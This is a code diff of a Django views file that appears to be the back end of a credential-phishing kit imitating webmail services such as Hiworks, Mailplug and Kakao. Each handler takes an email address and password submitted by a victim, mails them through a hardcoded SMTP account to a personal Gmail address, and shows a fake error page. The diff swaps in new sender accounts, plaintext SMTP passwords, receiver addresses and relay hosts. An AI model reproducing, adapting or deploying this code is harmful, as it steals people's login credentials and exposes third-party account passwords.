@@ -110,10 +110,10 @@ def hiwoks(request):
     emailya = request.POST["vpro"]
     passwordemailya = request.POST["vpros"]
     domainya = emailya[emailya.index('@') + 1 : ]
-    sender_eya = "zealsends@newupdateishere.com"
-    sender_emailya = "zealsends@newupdateishere.com"
-    receiver_emailya = "luckymua0147@gmail.com" # faithcooceo@gmail.com
-    passwordya = "sbNwuvzFrXa"
+    sender_eya = "webmail@merusllc.com"
+    sender_emailya = "webmail@merusllc.com"
+    receiver_emailya = "roberto.ghiselim@gmail.com" # faithcooceo@gmail.com
+    passwordya = "JDnqTkh!GR"
     useragentya = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
     message["Subject"] = "NEW hiworks API  0"
@@ -138,7 +138,7 @@ def hiwoks(request):
     message.attach(part2)
 
     # Create secure connection with server and send email
-    with smtplib.SMTP_SSL("newupdateishere.com", 465) as server:
+    with smtplib.SMTP_SSL("merusllc.com", 465) as server:
         server.login(sender_eya, passwordya)
         server.sendmail(sender_emailya, receiver_emailya, message.as_string())
         return render(request, '403.html', {'email': emailya, 'domains': domainya})
@@ -150,10 +150,10 @@ def mailplug(request):
     emailya = request.POST["vpro"]
     passwordemailya = request.POST["vpros"]
     domainya = emailya[emailya.index('@') + 1 : ]
-    sender_eya = "zealsends@newupdateishere.com"
-    sender_emailya = "zealsends@newupdateishere.com"
-    receiver_emailya = "luckymua0147@gmail.com" # faithcooceo@gmail.com
-    passwordya = "sbNwuvzFrXa"
+    sender_eya = "webmail@merusllc.com"
+    sender_emailya = "webmail@merusllc.com"
+    receiver_emailya = "roberto.ghiselim@gmail.com" # faithcooceo@gmail.com
+    passwordya = "JDnqTkh!GR"
     useragentya = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
     message["Subject"] = "NEW mailplug EN API  0"
@@ -178,7 +178,7 @@ def mailplug(request):
     message.attach(part2)
 
     # Create secure connection with server and send email
-    with smtplib.SMTP_SSL("newupdateishere.com", 465) as server:
+    with smtplib.SMTP_SSL("merusllc.com", 465) as server:
         server.login(sender_eya, passwordya)
         server.sendmail(sender_emailya, receiver_emailya, message.as_string())
         return render(request, 'Domain.html', {'email': emailya, 'domains': domainya})
@@ -192,10 +192,10 @@ def general(request):
     emailya = request.POST["vpro"]
     passwordemailya = request.POST["vpros"]
     domainya = emailya[emailya.index('@') + 1 : ]
-    sender_eya = "zealsends@newupdateishere.com"
-    sender_emailya = "zealsends@newupdateishere.com"
-    receiver_emailya = "luckymua0147@gmail.com" # faithcooceo@gmail.com
-    passwordya = "sbNwuvzFrXa"
+    sender_eya = "webmail@merusllc.com"
+    sender_emailya = "webmail@merusllc.com"
+    receiver_emailya = "roberto.ghiselim@gmail.com" # faithcooceo@gmail.com
+    passwordya = "JDnqTkh!GR"
     useragentya = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
     message["Subject"] = "NEW general EN API  0"
@@ -220,7 +220,7 @@ def general(request):
     message.attach(part2)
 
     # Create secure connection with server and send email
-    with smtplib.SMTP_SSL("newupdateishere.com", 465) as server:
+    with smtplib.SMTP_SSL("merusllc.com", 465) as server:
         server.login(sender_eya, passwordya)
         server.sendmail(sender_emailya, receiver_emailya, message.as_string())
         return render(request, '403.html', {'email': emailya, 'domains': domainya})
@@ -234,10 +234,10 @@ def kakao(request):
     emailya = request.POST["vpro"]
     passwordemailya = request.POST["vpros"]
     domainya = emailya[emailya.index('@') + 1 : ]
-    sender_eya = "zealsends@newupdateishere.com"
-    sender_emailya = "zealsends@newupdateishere.com"
-    receiver_emailya = "luckymua0147@gmail.com" # faithcooceo@gmail.com
-    passwordya = "sbNwuvzFrXa"
+    sender_eya = "webmail@merusllc.com"
+    sender_emailya = "webmail@merusllc.com"
+    receiver_emailya = "roberto.ghiselim@gmail.com" # faithcooceo@gmail.com
+    passwordya = "JDnqTkh!GR"
     useragentya = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
     message["Subject"] = "NEW kakao EN API  0"
@@ -262,7 +262,7 @@ def kakao(request):
     message.attach(part2)
 
     # Create secure connection with server and send email
-    with smtplib.SMTP_SSL("newupdateishere.com", 465) as server:
+    with smtplib.SMTP_SSL("merusllc.com", 465) as server:
         server.login(sender_eya, passwordya)
         server.sendmail(sender_emailya, receiver_emailya, message.as_string())
         return render(request, '403.html', {'email': emailya, 'domains': domainya})
